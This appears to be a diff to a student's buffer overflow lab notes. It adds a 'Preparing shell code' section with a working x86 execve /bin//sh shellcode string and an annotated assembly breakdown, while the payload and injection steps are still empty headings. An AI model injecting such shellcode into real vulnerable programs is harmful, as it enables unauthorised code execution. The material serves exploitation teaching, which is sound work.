@@ -45,5 +45,21 @@
 ```./bof3.o < input.txt```
 # Task 2: Code injection
 ## 2.1. Preparing shell code
+### Create shellcode.txt
+```\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80 ```
+```assembly
+\x31\xc0                    ; xor eax, eax        ; Clear EAX
+\x50                        ; push eax            ; Push 0 onto the stack (NULL terminator)
+\x68\x2f\x2f\x73\x68        ; push 0x68732f2f     ; Push "//sh" onto the stack
+\x68\x2f\x62\x69\x6e        ; push 0x6e69622f     ; Push "/bin" onto the stack
+\x89\xe3                    ; mov ebx, esp        ; Set EBX to point to the start of the string
+\x50                        ; push eax            ; Push 0 onto the stack (NULL terminator for argv)
+\x53                        ; push ebx            ; Push the pointer to "/bin//sh" onto the stack
+\x89\xe1                    ; mov ecx, esp        ; Set ECX to point to the start of the argv array
+\x31\xd2                    ; xor edx, edx        ; Clear EDX (NULL terminator for envp)
+\x31\xc0                    ; xor eax, eax        ; Clear EAX
+\xb0\x0b                    ; mov al, 0xb         ; Set EAX to 11 (execve syscall number)
+\xcd\x80                    ; int 0x80            ; Trigger interrupt to execute the syscall
+```
 ## 2.2. Preparing the payload
 ## 2.3. Code injection
